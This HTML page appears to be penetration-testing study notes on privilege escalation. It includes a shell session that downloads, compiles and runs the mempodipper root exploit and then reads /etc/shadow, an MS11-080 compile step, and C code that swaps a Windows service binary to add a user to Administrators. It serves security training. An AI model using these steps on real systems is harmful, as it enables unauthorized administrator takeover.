<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Methods</title>
</head><body><b><u>Privilege Escalation</u></b><br/>
<br/>
<b>Info</b>: Increase the level of access to a machine or network<br/>
<br/>
<b><u><br/>
</u><u>Scenario</u><br/>
<br/>
</b><b>Unix</b><br/>
<br/>
SSH with normal user privileges and the machine is running Ubuntu 10.11, 32 bit (never been patched). Use Root Exploit which affects CVE 2012-0056<br/>
<br/>
offsec@ubuntu:~$ id<br/>
uid=1000(offsec) gid=1000(offsec)<br/>
offsec@ubuntu:~$ cat /etc/shadow|grep root<br/>
cat: /etc/shadow: Permission denied<br/>
offsec@ubuntu:~$ wget -O exploit.c http://www.exploit-db.com/download/18411 <br/>
offsec@ubuntu:~$ gcc -o mempodipper exploit.c<br/>
offsec@ubuntu:~$ ./mempodipper<br/>
===============================<br/>
=<br/>
=<br/>
= ===============================<br/>
Mempodipper = by zx2c4 = Jan 21, 2012 =<br/>
[+] Waiting for transferred fd in parent.<br/>
[+] Executing child from child fork.<br/>
[+] Opening parent mem /proc/8810/mem in child. <br/>
[+] Sending fd 3 to parent.<br/>
[+] Received fd at 5.<br/>
[+] Assigning fd 5 to stderr.<br/>
[+] Reading su for exit@plt.<br/>
[+] Resolved exit@plt to 0x8049520.<br/>
[+] Calculating su padding.<br/>
[+] Seeking to offset 0x8049514.<br/>
[+] Executing su with shellcode.<br/>
# id<br/>
uid=0(root) gid=0(root)<br/>
# cat /etc/shadow |grep root <br/>
root:!:15806:0:99999:7:::<br/>
<br/>
<br/>
<b>Windows</b><br/>
<br/>
<b>Priv-Esc via poor validation of input raised form user mode to windows kernel. This scenario overwrites arbritrary memory in kernel space. <br/>
</b><br/>
<b>Info</b>: MS11-080 Affects Windows XP and Windows 2003 (32 bit and 64 bit)<br/>
<br/>
<b>Commands<br/>
<br/>
</b><b>Create standalone executable as windows does not come with python pre-installed. Run the following in a lab environment to produce the executable. </b><br/>
<br/>
python pyinstaller.py --onefile ms11-080.py<br/>
<br/>
<b>Copy executable to machine and then run it</b><br/>
<br/>
<br/>
<b>Priv-Esc via insecure file and service permissions </b><br/>
<br/>
<b>Info: </b>if file/servic permissions are not set properly, then it is possible to replace the file/service and run code with system level privileges.<br/>
<br/>
<b>Commands</b><br/>
<br/>
<b>Run icacls (windows utility that allows us to check for insecure permissions.</b><br/>
<br/>
c:\Program Files\Photodex\ProShow Producer&gt;icacls scsiaccess.exe <br/>
scsiaccess.exe NT AUTHORITY\SYSTEM:(I)(F)<ul><li style="list-style-type: none">BUILTIN\Administrators:(I)(F)</li>
<li style="list-style-type: none">BUILTIN\Users:(I)(RX)</li>
<li style="list-style-type: none">APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX) </li>
<li style="list-style-type: none">Everyone:(I)(F) &#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;# Note that everyone has permission to the service. </li>
<li style="list-style-type: none"></li>
</ul>
<b>Create Windows Executable that will add a regular Windows user called 'low' to the local Administrators group. <br/>
<br/>
</b>root@kali:~# cat useradd.c<br/>
<br/>
#include &lt;stdlib.h&gt; &#09;/* system, NULL, EXIT_FAILURE */<br/>
<br/>
int main () <br/>
{<ul><li style="list-style-type: none">int i;</li>
<li style="list-style-type: none">i=system ("net localgroup administrators low /add"); </li>
<li style="list-style-type: none">return 0;</li>
</ul>
}<b><br/>
</b><ul><li style="list-style-type: none"></li>
</ul>
<b>Cross-compile with mingw</b><br/>
<br/>
<br/>
root@kali:~# i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c<br/>
<br/>
<b>Replace original scsiaccess.exe file with the one created and next time the service is started, our fake scsiaccess.exe file will be run with SYSTEM privileges and out user 'low' to the admin group. </b><br/>
<br/>
<br/>
<br/>
</body></html>